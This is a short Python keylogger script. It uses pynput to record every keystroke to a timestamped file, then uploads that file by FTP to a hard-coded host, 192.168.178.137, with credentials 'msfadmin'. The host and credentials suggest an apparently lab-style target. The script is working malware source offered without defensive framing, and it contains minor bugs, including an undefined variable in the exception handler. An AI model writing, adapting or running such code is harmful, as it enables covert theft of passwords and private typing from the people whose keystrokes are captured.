#!/bin/python3

from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = " "

#showing time stamp and enter the data into klog-res.txt(in current folder)
logging.basicConfig(filename=(logdir+"klog-res.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

#function when pressing key in keyboard
def pressing_key(Key):
	try:
		logging.info(str(Key))
	except AttributeError:
		print("A special key (0) has been pressed. ".format(key))

#terminate listening session with esc
def releasing_key(key):
	if key == Key.esc:
		return False

#Listening to the keystroke		
print("\nStarted listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
	listener.join()

#hook em' to connect to the ftp server
print("\nConnecting to the FTP and sending the data...")

sess = ftplib.FTP("192.168.178.137", "msfadmin", "msfadmin")
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt", file)
file.close()
sess.quit()
